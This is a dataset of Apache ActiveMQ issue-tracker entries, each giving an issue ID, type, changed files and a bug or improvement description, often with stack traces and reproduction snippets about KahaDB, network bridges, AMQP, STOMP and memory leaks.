The KahaDB checkForCorruptJournalFiles option validates the checksum of every journal batch record on startup. If a single producer writes many small messages, the batch sizes in the journal will be small. The current check implementation reads each batch at a time with a fseek/read sequence that can be very slow over shared disks.The check can be a quick buffered sequential read using the maxBatchSize which should already be tuned to match the disk transfer rate.
issueID:AMQ-6778
type:Bug
changed files:
texts:Advisories are dropped till broker is fully started in error
The Advisory broker fire is conditional on the broker being fully started. This has been present for the longest time however the started flag has been modified to include a countDownLatch that is triggered on start completion.This means that consumers that connect to the active transportConnectors do not result in advisories which can mean incoming networkConnectors can mis this advise in error which results in the demand being ignored.From what I can see, the check for started does not add value and in the event of a failure to fire an advisory the error will be caught and logged rather than being ignored as it is now.
issueID:AMQ-6787
type:Bug
changed files:
texts:Memory leak - JaasAuthenticationBroker retaining instances of JaasAuthenticationBroker$JaasSecurityContext for connections that fail with InvalidClientIDException
If a client can authenticate but subsequently fails to add a connection due to InvalidClientIDException - clientId already in use for example. The security context is retained by the JaasAuthenticationBroker in error.
issueID:AMQ-6788
type:Bug
changed files:BrokerService.java
texts:ClassNotFoundException PListStoreImpl when trying to start an embedded broker with memory persistence
I try to start an embedded broker:        broker = new BrokerService();        broker.setPersistenceAdapter(new MemoryPersistenceAdapter());        broker.start();java.lang.RuntimeException: java.lang.ClassNotFoundException: org.apache.activemq.store.kahadb.plist.PListStoreImplFor details see:https://apaste.info/vIkj
issueID:AMQ-6790
type:Task
changed files:
texts:AMQP: Update Qpid JMS and Qpid Proton-J
Update to latest release Qpid JMS 0.24.0 and Proton-j 0.20.0
issueID:AMQ-6792
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:masterslave: transport blocked socket write can block network bridge stop in error
With a blocked socket write, the failover (use for masterslave) transport holds the reconnect mutex. this blocks normal stop pending the completion of the write. If the write blocks and there is no timeout exception, the transport stays up in error even when stop is called on the network bridge which can block broker shutdown.Threads:"ActiveMQ BrokerService[amq10] Task-147" - Thread t@45016   java.lang.Thread.State: RUNNABLE at java.net.SocketOutputStream.socketWrite0(Native Method) at java.net.SocketOutputStream.__AW_socketWrite(SocketOutputStream.java:111) at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java) at java.net.SocketOutputStream.write(SocketOutputStream.java:155) at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:886) at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:857) at sun.security.ssl.AppOutputStream.__AW_write(AppOutputStream.java:123) - locked <5ce0bde7> (a sun.security.ssl.AppOutputStream) at sun.security.ssl.AppOutputStream.write(AppOutputStream.java) at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115) at java.io.DataOutputStream.flush(DataOutputStream.java:123) at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176) at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:335) at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:317) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85) at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:116) at org.apache.activemq.transport.failover.FailoverTransport.__AW_oneway(FailoverTransport.java:667) - locked <47e37945> (a java.lang.Object) at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:1008) at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:207) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:162) at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:154) - locked <467f411f> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:131) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1457) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:1017) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)"IOExceptionHandler: stopping BrokerService[amq10]" - Thread t@201006   java.lang.Thread.State: BLOCKED at org.apache.activemq.transport.failover.FailoverTransport.__AW_stop(FailoverTransport.java:380) - waiting to lock <47e37945> (a java.lang.Object) owned by "ActiveMQ BrokerService[amq10] Task-147" t@45016 at org.apache.activemq.transport.failover.FailoverTransport.stop(FailoverTransport.java) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.network.DemandForwardingBridgeSupport.__AW_stop(DemandForwardingBridgeSupport.java:307) at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java) at org.apache.activemq.network.DiscoveryNetworkConnector.handleStop(DiscoveryNetworkConnector.java:223) at org.apache.activemq.network.NetworkConnector$1.doStop(NetworkConnector.java:65) at org.apache.activemq.util.ServiceSupport.__AW_stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java) at org.apache.activemq.network.NetworkConnector.stop(NetworkConnector.java:165) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.__AW_stopAllConnectors(BrokerService.java:2191) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java) at org.apache.activemq.broker.BrokerService.__AW_stop(BrokerService.java:805) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java) at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:122) at org.apache.activemq.util.DefaultIOExceptionHandler$2.run(DefaultIOExceptionHandler.java:181)
issueID:AMQ-6796
type:Bug
changed files:
texts:Acknowledging messages out of order in a STOMP 1.1 transaction raises exception
Reproducing the problem: Receive two messages via STOMP on a subscription with ack:client-individual Start a transaction Acknowledge message #2 Acknowledge message #1 Commit the transactionExpected behaviour: Both messages are acknowledged, life goes onObserved behaviour: Exception is raised{{javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 0, responseRequired = false, ackType = 2, consumerId = ID:(...)-6:555:-1:1, firstMessageId = null, lastMessageId = ID:(...)-6:555:-1:1:1, destination = queue://(...), transactionId = null, messageCount = 2, poisonCause = null}; Expected message count (2) differs from count in dispatched-list (1)   at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:519)   at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:211)   at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:528)   at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:475)(..)}}I have prepared a unit test for this (patch file).The exception is not raised if the messages are acknowledged outside of a transaction.
issueID:AMQ-6798
type:Bug
changed files:
texts:Queue left StoreUsage object in memory. Memory leak
Our services create queues on broker. It queues exists in 1 day then they become inactive, cause clients turned off. Active mq removes them by Inactivity timeout 60 seconds. But memory consumption of broker grows permanently. We acquired heap dump, and saw that org.apache.activemq.usage.StoreUsage contains 2.7 millions of object with 1.5 gb. That objects belongs to StoreUsage of queues. I don"t sure that we uses broker as it should be used. Maybe we shouldn"t create new queues. But this behavior is stranged for me.
issueID:AMQ-6799
type:Bug
changed files:
texts:IOExceptionHandler during the startup
When the broker is starting and exception happens during persistence adapter startup (or its locker) an IOExceptionHandler will be called. This can lead to inconsistent state where the handler will stop the connector and launch a thread to check adapter, while the broker has been stopped due to startup error.The solution to this would be to allow handler only to work when the broker is fully stared.
issueID:AMQ-6801
type:Bug
changed files:WSTransportProxy.java
texts:race in WSTransportProxy startup can lead to WebSocket connection failure
There is a race between the startup and arrival of data in the WSTransportProxy class that can lead to failure to create a WebSocket connection because there is no transport listener available when data arrives, at least over AMQP where the SASL header arrives and can"t be processed. This has been observed causing Websocket related test failures in the ActiveMQ CI jobs and also in Qpid JMS CI jobs (seemingly only since it was updated to use 5.15.0, though this code hasn"t changed since introduction in 5.14.0 it appears?).When supplied with new frame data, there is a check that the WSTransportProxy instance has already been started, and if not a latch wait is performed until it is before proceeding. This latch is tripped during startup but before the transport listener has been set, meaning it is possible for frame data processing to proceed before the listener is actually set on the transport. Also, the listener field isn"t volatile so it could additionally be true that the thread processing the data doesnt yet see a listener which has been set on the transport in the startup thread. Moving the latch trip to after setting the listener should address both those issues.
issueID:AMQ-6804
type:Improvement
changed files:
texts:AMQP: Improve transfer tag generation and tag pooling
Use a more efficient storage mechanism for pooled transfer tags, and a faster means of creating the tags that generates less GC overhead.
issueID:AMQ-6808
type:Improvement
changed files:
texts:Preserve destination when browsing scheduled messages
It is possible to browse scheduled messages by sending a message to ScheduledMessage.AMQ_SCHEDULER_MANAGEMENT_DESTINATION. Unfortunately (for us) the most interesting data is missing. SchedulerBroker#sendScheduledJob replaces the original destination from the scheduled message with the temporary destination of the client asking for the information. That is obviously necessary, but it means we can"t figure out the final destination for the messages.We sometimes have thousands of messages and the broker cluster gets into trouble. We want to analyze the problem by checking how many messages there are for various destinations when this happens. At present that is difficult without changing the (many) posting systems to add headers.The solution is simple. Copy the original destination to a JMS property (schedulerOriginalDestination for example) before overwriting it. I will create a pull request.
issueID:AMQ-6809
type:Bug
changed files:
texts:activemq-client returns unexpected length code on first read from stream containing empty byte array
Consider this code private void testEmptyBufferInput() throws JMSException {  byte[] readList = new byte[BYTE_LIST.length - 1];  byte[] emptyList = {};  LOG.info("Streaming BYTE_LIST message testing EMPTY buffer input");  stream.writeBytes(emptyList);  stream.reset();  LOG.info("Reading BYTE_LIST message testing EMPTY buffer input");  final int IS_EMPTY = 0;  assertThat(stream.readBytes(readList)).isEqualTo(IS_EMPTY); }The code above works with qpid-jms, but fails with activemq-client on the assertThat with error message java.lang.AssertionError: Not true that <-1> is equal to <0>. Judging by documentation http://docs.oracle.com/javaee/6/api/javax/jms/StreamMessage.html#readBytes(byte[]), I think that qpid-jms behavior is correct and what activemq-client does is a bug.
issueID:AMQ-6811
type:Bug
changed files:
texts:ReduceMemoryFootprint does not work on messages with no body
I was debugging an out of memory error on a broker that was caused by the unmarshalled message properties being in memory even though the reduceMemoryFootprint flag was set to true so this map should have been cleared after send.  Upon further investigation I realized it was because the isMarshalled() method on a message only checks if the marshalled content is not null however the check should actually be if the content is not null OR if the unmarshalled value is null/empty (ie no body set at all).  This same check is already done properly for header properties and just needs to be extended for the body.
issueID:AMQ-6812
type:Task
changed files:
texts:update to proton-j 0.22.0
update to proton-j 0.22.0
issueID:AMQ-6813
type:Bug
changed files:AmqpConnection.java
texts:handle edge cases when driving transport#tick(now) with nanoTime derived values
None
issueID:AMQ-6815
type:Bug
changed files:
texts:KahaDB checkpoint needs to fail fast in the event of journal write failure
KahaDB checkpoint does some async updated to the journal and syncs to the index. However the async journal updates can error out and not get reported leading to the index metadata being stale. This can lead to reading an invalid location on restart which may result in full recovery of the index.Any exception from the async store needs to cause the checkpoint to fail.In addition, on reading a corrupt location, we can do a sanity check to avoid a potential OOM by validating the size before allocation.
issueID:AMQ-682
type:Improvement
changed files:
texts:several functions spelled wrong, impairs code readability
In the OpenWire marshalling code / scripts for Java, s/Unmarsal/Unmarshal/.In OpenWireFormat.java, WireFormatNegotiator.java, and OpenWireFormatFactory.java, s/negociat/negotiate/.Nitpicks, yes, but the cause of some wasted time looking around for functions that didn"t exist.
issueID:AMQ-6820
type:Bug
changed files:SelectorSelection.java
texts:NIO transport should properly handle ClosedChannelException
The NIO transport does not properly handle a ClosedChannelException when it happens inside the SelectorSelection class.  Instead of properly disposing of the transport it calls System.out.println() for the exception and keeps the transport alive.  This caused a NPE later when the enable() method was called because the SelectionKey was null.  The fix is to call onError() when the ClosedChannelException occurs so things get cleaned up and logged properly.
issueID:AMQ-6821
type:Task
changed files:
texts:update to qpid-jms 0.25.0
update to qpid-jms 0.25.0
issueID:AMQ-6823
type:Bug
changed files:
texts:No message received with prefetch 0 over http
The http connector doesn"t seem to work with prefetchSize 0.It works with tcp connector.AMQ configuration:        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>            <transportConnector name="http" uri="http://0.0.0.0:8080"/>        </transportConnectors>Code to reproduce: String brokerURL = "http://localhost:8080"; //String brokerURL = "tcp://localhost:61616"; ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory(brokerURL); ActiveMQPrefetchPolicy pp = new ActiveMQPrefetchPolicy(); pp.setQueuePrefetch(0); cf.setPrefetchPolicy(pp); Connection con = cf.createConnection(); con.start(); Session s = con.createSession(false, Session.AUTO_ACKNOWLEDGE); Destination d = s.createQueue("test"); MessageProducer p = s.createProducer(d); MessageConsumer c = s.createConsumer(d); Message m = new ActiveMQTextMessage(); m.setStringProperty("test", "test"); p.send(m); c.receive(); p.close(); s.close(); con.stop();
issueID:AMQ-6824
type:Bug
changed files:
texts:PrefetchExtension growth with transacted consumers
With a transacted consumer on either a topic or queue the prefetch extension increments only. This leads to flow control failing b/c the subscription is never full. Messages can accumulate on the subscription dispatch channel if the consumer is blocked or slow. As a result, memory usage limits can be exceeded for topics.There is a similar issue with client_ack mode and prefetch.
issueID:AMQ-6828
type:Improvement
changed files:
texts:Improvement to python AMQP example
The AMQP python example has a defect – it doesn’t dequeue - and is pre-python 3 syntax.Find attached a patch for replacing listener.py & publisher.pyPS – the patch includes a grammer fix assembly/src/release/examples/amqp/java/readme.md
issueID:AMQ-6829
type:Improvement
changed files:
texts:Add inflight count to dstat queues command output
The inflight count is handy to see for queues to figure out if consumers are slow
issueID:AMQ-683
type:Bug
changed files:ManagedRegionBroker.java
texts:Memory leak in ManagedRegionBroker
A memory leak in the ManagedRegionBroker - not critical because the work around currently is to set the property on the broker useJmx=false
issueID:AMQ-6830
type:Task
changed files:
texts:AMQP: Update Qpid JMS to latest 0.26.0 release and match its netty version 4.1.16.Final
Update Qpid JMS to 0.26.0 and match it"s Netty 4.1.16.Final release.
issueID:AMQ-6831
type:Bug
changed files:ByteSequence.java
Journal.java
texts:Broker fails to start complaining about missing/corrupt journal files after upgrading to 5.15.1
2017-10-09 12:29:36.802 ERROR 4197 --- [pool-3-thread-1] org.deku.leoz.node.Application           : java.io.IOException: Detected missing/corrupt journal files referenced by:[0:ActiveMQ.DLQ] 3 messages affected.java.lang.Error: java.io.IOException: Detected missing/corrupt journal files referenced by:[0:ActiveMQ.DLQ] 3 messages affected. at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1148) ~[na:1.8.0_131] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_131] at java.lang.Thread.run(Thread.java:748) ~[na:1.8.0_131]Caused by: java.io.IOException: Detected missing/corrupt journal files referenced by:[0:ActiveMQ.DLQ] 3 messages affected. at org.apache.activemq.store.kahadb.MessageDatabase.recoverIndex(MessageDatabase.java:965) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.MessageDatabase$5.execute(MessageDatabase.java:717) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:714) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:473) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:493) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:297) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:219) ~[activemq-kahadb-store-5.15.1.jar:5.15.1] at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) ~[activemq-client-5.15.1.jar:5.15.1] at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.doStart(KahaDBPersistenceAdapter.java:232) ~[activemq-kahadb-store-5.15.1.jar:5.15.1]Downgrading to 5.15.0 resolves the problem.This is an embedded broker setup, using        val pa = brokerService.persistenceAdapter as KahaDBPersistenceAdapter        pa.isCheckForCorruptJournalFiles = true        pa.isIgnoreMissingJournalfiles = false
issueID:AMQ-6834
type:Bug
changed files:
texts:ClassNotFoundException when install activemq-osgi bundle with Camel 2.19.x into OSGi container
Start karaf OSGi container, install Camel 2.19.2 and activemq-client feature (activemq-osgi bundle), then the ClassNotFoundException is thrown:2017-10-10T10:12:30,012 | WARN  | pool-46-thread-2 | aries.blueprint.spring.Activator   57 | 291 - org.apache.aries.blueprint.spring - 0.4.0 | Error starting extension: org.apache.activemq.activemq-osgi/5.15.0java.lang.ClassNotFoundException: org.apache.camel.osgi.CamelNamespaceHandler cannot be found by org.apache.activemq.activemq-osgi_5.15.0 at org.eclipse.osgi.internal.loader.BundleLoader.findClassInternal(BundleLoader.java:461) [?:?] at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:372) [?:?] at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:364) [?:?] at org.eclipse.osgi.internal.loader.ModuleClassLoader.loadClass(ModuleClassLoader.java:161) [?:?] at java.lang.ClassLoader.loadClass(ClassLoader.java:357) [?:?] at org.eclipse.osgi.internal.framework.EquinoxBundle.loadClass(EquinoxBundle.java:564) [?:?] at org.apache.aries.blueprint.spring.SpringExtension.start(SpringExtension.java:64) [291:org.apache.aries.blueprint.spring:0.4.0] at org.apache.felix.utils.extender.AbstractExtender$1.run(AbstractExtender.java:265) [291:org.apache.aries.blueprint.spring:0.4.0] at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) [?:?] at java.util.concurrent.FutureTask.run(FutureTask.java:266) [?:?] at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180) [?:?] at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293) [?:?] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [?:?] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [?:?] at java.lang.Thread.run(Thread.java:745) [?:?]From Camel 2.19.x, the camel-spring-dm feature/bundle has been totally removed, that"s why the org.apache.camel.osgi.CamelNamespaceHandler couldn"t be found anymore. http://camel.apache.org/schema/osgi=org.apache.camel.osgi.CamelNamespaceHandlerThere is still definition above in the spring.handlers of the activemq-osgi bundle. this may need to be removed or updated from spring.handlers.
issueID:AMQ-6847
type:Bug
changed files:
texts:Immediate poison ACK after move from DLQ leads to message loss
Setup setMaximumRedeliveries(0) Throw RuntimeException (Poison ACK) in consumer directly after receiving messageScenario Move message from DLQ to original input queue (either web console or JMX retryMessages) Processing of message fails again directly The message is considered to be still on the DLQ on the rejection and ActiveMQ logs "Not adding duplicate to DLQ"Introducing a delay before throwing the exception in the client will get around the issue.I initially noticed the issue when using an AMQP reject (Apache Qpid Proton) after which I reproduced similar conditions (instant poison ACK) it with the JMS client. The attached Java app will reproduce the issue on 5.14.5 and 5.15.2.Might be related to AMQ-5752.2017-10-24 13:38:11,275 | DEBUG | Not adding duplicate to DLQ: ID:xxx-32848-1508845049112-6:1:1:1:1, dest: queue://TEST | org.apache.activemq.broker.region.policy.AbstractDeadLetterStrategy | ActiveMQ Transport: tcp:///127.0.0.1:36360@61616
issueID:AMQ-6849
type:Improvement
changed files:
texts:Support a virtual topic discard mode for full consumer queues
For regular topics, the slow consumer problem has a few solutions via the discarding policiesFor Virtual Topics, message expiry is the only viable option, however dispatch will be blocked till expiry kicks in. In the same way that we can discard some messages for a slow topic subscriber it can make sense to discard messages for a subscriber queue that is full such that dispatch to fast queues can continue.
issueID:AMQ-685
type:Bug
changed files:
texts:CMS C++ Client - bug handling bytes messages
The content-length property isn"t used properly when reading bytes messages
issueID:AMQ-6854
type:Improvement
changed files:
texts:Log a warning if paging in for queues blocks on usage constraints
In a case where the cache is disabled but there is no flow control, messages can continue to be produced directly to the store.  Dispatch from memory will continue and paging in will work in the normal way.However it is possible for queues to starve each other when paging in, such that some queues with no messages in memory will not be able to page in.In this case, it is important that we log a warning to have some indication in the logs that consumers may be starved such that memory limits can be increased if necessary.
issueID:AMQ-6856
type:Task
changed files:
texts:AMQP: Update Qpid JMS to latest 0.27.0 release and Proton-j to 0.23.0 to match
Update Qpid JMS to latest 0.27.0 release and match it"s proton-j dep of 0.23.0
issueID:AMQ-6858
type:Bug
changed files:
texts:Fix several durable subscription bridge propagation issues
While testing bridging together 3 or more brokers I discovered several problems specifically related to durable subscription propagation.  In general durable network subscriptions were not propagating properly when using more than 2 brokers either by not being created at all, not being removed, or even in some cases the same durable was being added twice and causing bridge failures.This jira includes the following changes to fix these issues: Currently proxy network subscriptions are not eligible to be conduit.  For topics it doesn"t make sense to not use conduit subscriptions so this should be changed.  For queue subscriptions this can sometimes be useful to conduit as well so I added a new flag for this.  Not allowing conduit topic proxy network subs was causing collisions with durables and breaking bridges The durable sync process should only ignore network durable subs for the specific bridge it is syncing, it should still be re-adding subs for other bridges otherwise they will get dropped On demand subscription removal, the tracked demand sub should be checked to see if it"s a network demand sub and if it still has remote durable subs attached to it.  If it does they need to be cleaned up and removed Lastly, when creating a demand subscription the consumerId should only be changed if the consumer is for a direct bridge and not a proxy bridge otherwise the demand won"t be properly tracked and removed later
issueID:AMQ-6859
type:Bug
changed files:
texts:MQTT - topic name of the message
When using virtual topics and wildcards, a message sent to the subscriber will end up containing the topic name of the actual subscription. This was introduced with https://issues.apache.org/jira/browse/AMQ-6100, but as mqtt clients can"t use JMSOriginalDestination it"s useful not to change the original topic name, producer used to send a message to.
issueID:AMQ-686
type:Bug
changed files:
texts:CMS Client - unassigned value in ActiveMQConnectionFactory constructor
The brokerUrl member of ActiveMQConnectionFactory is not assigned a value in the ActiveMQConnectionFactory( const char*, const char*, const char* ) constructor.
issueID:AMQ-6861
type:Improvement
changed files:
texts:Allow customisation of network bridge creation logic
Currently network bridge factory have fixed logic. It would be nice to make it customizable.
issueID:AMQ-687
type:Bug
changed files:DurableConduitBridge.java
texts:Multiple durable topics don&#39;t work with network of brokers
There is a problem with a network of brokers with regards to a single consumer subscribing to multiple durable topics.  To recreate the issue, I changed examples/ConsumerTool.java to subscribe to two durable topics, with the createDurableSubscriber calls changed to look like this:                consumer = session.createDurableSubscriber(topic1, topic1.getTopicName() );                consumer2 = session.createDurableSubscriber( topic2, topic2.getTopicName() );This ensures that the name of the durable subscriptions are unique, rather than using the "consumerName" as the base example code does.The problem is with any remote brokers: it appears that the broker-to-broker code for durable subscriptions does not uniquely set the subscription name for multiple durable subscriptions to different topics.  Here is the message and exception information from the remote broker:<INFO> <org.apache.activemq.broker.AbstractConnection.Service> < Mon 2006/04/10 10:50:52:660 > <org.apache.activemq.broker.AbstractConnection.serviceException> <Thread&#91;tcp://sbtmdgca/170.137.15.64:61618,5,main&#93;> Async error occurred: javax.jms.JMSException: Durable consumer is in use for client: NC_ProdDN3AsbtmdgcasbtmdgcAMQDN_inboundProdDN3Bsbtgc0bsbtgc0AMQDN and subscriptionName: ProdDN3Bsbtgc0bsbtgc0AMQDN<INFO> Stack Trace follows:javax.jms.JMSException: Durable consumer is in use for client: NC_ProdDN3AsbtmdgcasbtmdgcAMQDN_inboundProdDN3Bsbtgc0bsbtgc0AMQDN and subscriptionName: ProdDN3Bsbtgc0bsbtgc0AMQDN        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:81)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:276)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:69)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:75)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:69)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:81)        at org.apache.activemq.broker.AbstractConnection.processAddConsumer(AbstractConnection.java:422)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:291)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:55)        at org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:344)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:324)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:274)        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:120)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)        at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:139)        at java.lang.Thread.run(Thread.java:595)You can see that the "subscriptionName" used from the originating broker is the brokerName.  This will never handle multiple durable subscriptions (different topics) from the same consumer.Perhaps in addition to the brokerName, the original topic name could be used?  Or, just the topic name, since clientId is supposed to make it unique anyway.
issueID:AMQ-6871
type:Bug
changed files:
texts:ActiveMQ client should send only generic platform details by default to server
By default the OpenWire Java client should send generic platform details to the broker to specify the type of client.  A flag on the URI can be used to send more detailed information about the client to the broker for debugging purposes.
issueID:AMQ-6872
type:Improvement
changed files:InboundTransformer.java
texts:AMQP: Use proper typing when accessing ApplicationProperties Map values
Use proper type casts for the ApplicationsProperties Map in which is specified as being String keyed.  This prevents issue should proton-j be updated to specify the generic type values on that Map and also removes an unnecessary toString call.
issueID:AMQ-6874
type:Task
changed files:
texts:AMQP: Update Qpid JMS to latest 0.29.0 release and Proton-j to 0.25.0 to match
None
issueID:AMQ-6875
type:Bug
changed files:
texts:Virtual destination consumers can create invalid demand for Virtual Topics
When testing out Virtual topics over a network bridge that has the virtual destination consumers feature enabled I noticed that the consumer advisories were wrong.  The destinations sent as part of the consumer advisories to create demand over the bridge are using the name of the Virtual Topic.  This is causing extra demand to flow across the network bridge in some cases because by default the VirtualTopic name is "VirtualTopic.>" .  So once one Virtual Topic is created on a remote broker then any messages sent to "VirtualTopic.>" on the local broker will be forwarded over to the other broker even if there is no VirtualTopic matching.The solution is to make sure to use the actual topic that the VirtualTopic is subscribed to as part of the advisory messags.
issueID:AMQ-6880
type:Bug
changed files:
texts:Incorrect comparison behaviour in TransportConnector.isMatchesCluster with Tokenised Filter
the clusterFilter should support a comma-delimited list of filter expressions.Consider a use case where we have brokers with prefixes, like east and west and we have specified a broker filter of "east.&#42;,west.&#42;"We add a new broker to the network, called "west-broker2." Looking at the code, this expression will fail out on the first test (against the "east.&#42;" filter token), setting result to false and failing to add the broker.Similarly, if we add a new broker called "east-broker2," the name will successfully test against the first filter token of "east.&#42;", then will subsequently fail against the following token of "west.&#42;" instead of breaking out.When a filter is set, we need to check for a match against all of the tokens in the filter.
issueID:AMQ-6884
type:Improvement
changed files:SelectorWorker.java
texts:NIO SelectorWorker should use logger instead of printStackTrace
There are a couple of spots in the SelectorWorker class where exceptions are printed using printStackTrace() instead of logged properly. They should be logged properly using SLF4J and not sent to stout so users can control the output.
issueID:AMQ-689
type:Bug
changed files:ServerSessionImpl.java
texts:Endpoint failed to process message: NullPointerException
